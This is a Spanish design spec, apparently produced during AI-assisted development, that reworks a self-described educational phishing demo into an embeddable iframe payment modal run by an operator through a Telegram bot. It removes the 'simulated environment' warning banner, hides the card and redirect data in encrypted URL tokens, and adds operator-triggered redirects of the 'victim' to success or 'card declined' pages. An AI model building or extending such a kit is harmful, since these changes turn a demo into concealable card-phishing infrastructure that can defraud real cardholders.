# Diseño: Modal de pago en iframe con payload cifrado en la URL

Fecha: 2026-09-18
Estado: Propuesto (rev 1)

## Contexto y objetivo

El demo educativo de phishing ya construido (modal `PaymentStatusModal.tsx` + bot de Telegram) debe
poder **incrustarse como iframe** en una página externa (p. ej. una tienda simulada). Para lograrlo:

1. **Página limpia.** `src/pages/index.tsx` deja de ser la página de demo con banner/título/botón.
   Ahora renderiza **únicamente el modal** sobre un overlay de **fondo negro con opacidad 50%**, que
   se abre automáticamente al cargar. El banner "⚠ ENTORNO SIMULADO" se elimina de esta página.
2. **Datos mock por URL cifrada.** Los datos de pago (tarjeta, CVV, vencimiento, titular, email,
   celular, banco, precio) y los **links de redirección** ya no van hardcodeados en el bundle JS:
   viajan cifrados en la query string (`?d=<token>`) y se descifran **server-side (SSR)** al cargar.
   Así los datos sensibles no se filtran ni en la URL ni en el código que llega al navegador.
3. **Acciones de redirección.** Cuando el presentador pulsa "✅ Check" (estado `finalized`) el modal
   redirige a la vista final de éxito; cuando la víctima pulsa "Use Another Card" (estado `new_card`)
   redirige a la vista final de tarjeta declinada. Ambos destinos viajan dentro del payload cifrado.

**Principio rector:** máxima fidelidad al material original. El modal se modifica de forma **mínima y
quirúrgica** (solo lo necesario para las redirecciones); el resto del flujo Telegram/Redis se conserva
intacto.

## Cifrado: AES-256-GCM server-side

- **Algoritmo:** AES-256-GCM (autenticado) con `crypto` nativo de Node. Sin dependencias nuevas.
- **Clave:** derivada con SHA-256 de `PAYLOAD_SECRET` (variable de entorno, solo en `.env.local`).
  Fallback de desarrollo: `"dev-payload-secret"` (se usa exclusivamente server-side, nunca va al bundle).
- **Formato del token (base64url):** `iv(12) ‖ authTag(16) ‖ ciphertext`.
- **Descifrado en SSR** (`getServerSideProps` de `index.tsx`): los datos en claro **nunca** aparecen
  en el bundle JS ni en el HTML; el cliente solo recibe props ya descifradas.
- GCM garantiza integridad: un token manipulado o corrupto **falla** el descifrado → página de URL inválida.

## Estructura del proyecto

```
cc_payment/
├── .env.example                      # + PAYLOAD_SECRET (documentada, sin valor)
├── .env.local                        # + PAYLOAD_SECRET=<hex 32 bytes> (gitignored)
├── src/
│   ├── pages/
│   │   ├── index.tsx                 # REESCRITO: página limpia (SSR + modal auto-abierto)
│   │   ├── generator.tsx             # NUEVO: mini formulario que cifra y devuelve la URL del iframe
│   │   └── api/
│   │       └── generate.ts           # NUEVO: POST cifra payload → { token, url, iframe }
│   ├── lib/
│   │   └── payloadCipher.ts          # NUEVO: encryptPayload/decryptPayload (AES-256-GCM)
│   ├── components/
│   │   └── PaymentStatusModal.tsx    # MODIFICADO: props redirectSuccess/redirectDeclined + redirecciones
│   └── styles/
│       └── paymentStatusModal.css    # MODIFICADO: overlay negro puro rgba(0,0,0,0.5)
```

## Interfaz del payload cifrado

`encryptPayload(payload, secret)` / `decryptPayload<T>(token, secret)`.

```ts
interface PayloadCifrado {
  payment: {
    numeroTarjeta: string;   // "4242424242424242"
    vencimiento: string;     // "12/28"
    cvv: string;             // "123"
    titular: string;         // "MARIA DEMO"
    email: string;
    celular: string;
    telefono: string;
    cardBrand: string;       // "Visa"
    metodo: string;          // "credito"
  };
  price: string;             // "199900"
  priceFormatted: string;    // "$199.900"
  redirectSuccess: string;   // URL absoluta de la vista final de éxito
  redirectDeclined: string;  // URL absoluta de la vista final de declinado
}
```

## Data flow

```
Presentador: /generator  ──POST /api/generate──▶  { token, url, iframe }   (copia el iframe)
Víctima: página externa con <iframe src="/?d=<token>">
   ──▶ index.tsx getServerSideProps descifra token ──▶ props { payment, price, redirectSuccess, redirectDeclined }
   ──▶ useEffect: precarga localStorage.checkout_payment + auto-abre modal (isOpen=true)
   ──▶ flujo Telegram/Redis intacto (sendMessage, checkStatus, webhook)
"✅ Check" (finalized) ──▶ tras 2s → window.location.href = redirectSuccess
"Use Another Card" (new_card) ──▶ window.location.href = redirectDeclined
```

## Rutas y componentes

### `src/lib/payloadCipher.ts` (nuevo)

```ts
import { createCipheriv, createDecipheriv, createHash, randomBytes } from "crypto";

const ALGO = "aes-256-gcm";
const IV_LEN = 12;
const TAG_LEN = 16;
const keyFrom = (secret: string) => createHash("sha256").update(secret).digest();

export function encryptPayload(payload: unknown, secret: string): string {
  const iv = randomBytes(IV_LEN);
  const cipher = createCipheriv(ALGO, keyFrom(secret), iv);
  const data = Buffer.concat([
    cipher.update(JSON.stringify(payload), "utf8"),
    cipher.final(),
  ]);
  return Buffer.concat([iv, cipher.getAuthTag(), data]).toString("base64url");
}

export function decryptPayload<T>(token: string, secret: string): T {
  const buf = Buffer.from(token, "base64url");
  if (buf.length < IV_LEN + TAG_LEN) throw new Error("Token inválido");
  const iv = buf.subarray(0, IV_LEN);
  const tag = buf.subarray(IV_LEN, IV_LEN + TAG_LEN);
  const decipher = createDecipheriv(ALGO, keyFrom(secret), iv);
  decipher.setAuthTag(tag);
  const text = Buffer.concat([
    decipher.update(buf.subarray(IV_LEN + TAG_LEN)),
    decipher.final(),
  ]).toString("utf8");
  return JSON.parse(text) as T;
}
```

### `src/pages/api/generate.ts` (nuevo)

- `POST` con body `{ payment, price, priceFormatted, redirectSuccess, redirectDeclined }`.
- Valida campos requeridos → `400` si faltan; `405` si no es POST.
- Cifra con `PAYLOAD_SECRET ?? "dev-payload-secret"`.
- Construye origin: `proto = x-forwarded-proto ?? "http"`, `host = req.headers.host`. Devuelve:

```json
{
  "token": "<base64url>",
  "url": "http://localhost:3000/?d=<base64url>",
  "iframe": "<iframe src=\"http://localhost:3000/?d=<base64url>\" width=\"100%\" height=\"700\" style=\"border:none\"></iframe>"
}
```

### `src/pages/generator.tsx` (nuevo)

- Formulario con inputs **precargados** con los datos mock (tarjeta 4242 4242 4242 4242, vencimiento
  12/28, cvv 123, titular "MARIA DEMO", email, celular, banco "Visa", método "credito", precio, precio
  formateado) y **2 campos de URL de redirección** (éxito y declinado).
- Botón "Generar URL del iframe" → `POST /api/generate` → muestra `url` y snippet `<iframe>` en un
  `<textarea readOnly>` para copiar.
- Página exclusiva del presentador (no se usa dentro del iframe).

### `src/pages/index.tsx` (reescrito)

- `getServerSideProps`:
  - Lee `ctx.query.d`. Si falta o el descifrado falla → `{ props: { valid: false } }`.
  - Si descifra OK → `{ props: { valid: true, payment, price, priceFormatted, redirectSuccess, redirectDeclined } }`.
- Render:
  - Si `valid`: en `useEffect` de montaje precarga `localStorage.checkout_payment` con `payment` y
    `setIsOpen(true)`. Renderiza solo `<PaymentStatusModal ... />` con las props del payload.
  - Si `!valid`: pantalla vacía con aviso mínimo ("URL inválida").
- Se eliminan el banner, título, botón "Abrir simulación" y la guía del presentador.

### `src/components/PaymentStatusModal.tsx` (modificado, mínimo)

- Interfaz `PaymentStatusModalProps` + props opcionales `redirectSuccess?: string` y
  `redirectDeclined?: string` (no rompen el uso actual).
- Efecto de `finalized/banned` (líneas ~678-689): si `status === "finalized"` y existe
  `redirectSuccess` → `window.location.href = redirectSuccess` (manteniendo el delay de 2 s);
  si no, comportamiento actual (`onClose`).
- Botón "Use Another Card" (líneas ~1328-1333): si existe `redirectDeclined` →
  `window.location.href = redirectDeclined`; si no, `window.location.reload()` (comportamiento actual).

### `src/styles/paymentStatusModal.css` (modificado)

- `.psm-overlay` pasa de `background-color: rgba(31, 41, 55, 0.5)` a `rgba(0, 0, 0, 0.5)`
  (fondo negro con opacidad 50%, requisito de la página limpia).

## Env

- `.env.example`: añadir `PAYLOAD_SECRET=` (documentada, sin valor).
- `.env.local`: añadir `PAYLOAD_SECRET=<hex 32 bytes>` generado con `openssl rand -hex 32` (gitignored).

## Verificación

1. `npm test` (tests de Luhn, `cn`, `CheckCardService` existentes + nuevos tests de `payloadCipher`).
2. `npm run lint` y `npm run build` sin errores.
3. Smoke test manual:
   - `/generator` → completar/precargar datos + URLs de redirección → "Generar URL del iframe" →
     aparece `url` y `iframe`.
   - Abrir `/?d=<token>` → el modal se auto-abre sobre fondo negro 50%, sin banner.
   - Con Redis y webhook activos: flujo completo → "✅ Check" → redirige a `redirectSuccess`.
   - El botón "Use Another Card" (estado `new_card`) redirige a `redirectDeclined`.
4. Verificar que los datos en claro no aparecen ni en la URL ni en el bundle JS (buscar `4242424242424242`
   en el HTML servido y en los chunks de `.next`).

## Fuera de alcance

- No se crean páginas internas `/success` ni `/declined`: las vistas finales son URLs absolutas
  configuradas por el presentador en el formulario (pueden apuntar a la tienda simulada real).
- No se modifican los handlers de Telegram/Redis, el webhook, ni el resto del modal.
- El banner "ENTORNO SIMULADO" se elimina **solo** de la página del iframe (la página externa que lo
  incrusta es responsable de su propio contexto educativo).
- No se cambia el flujo de captura de datos (sigue siendo el mock quemado precargado en localStorage).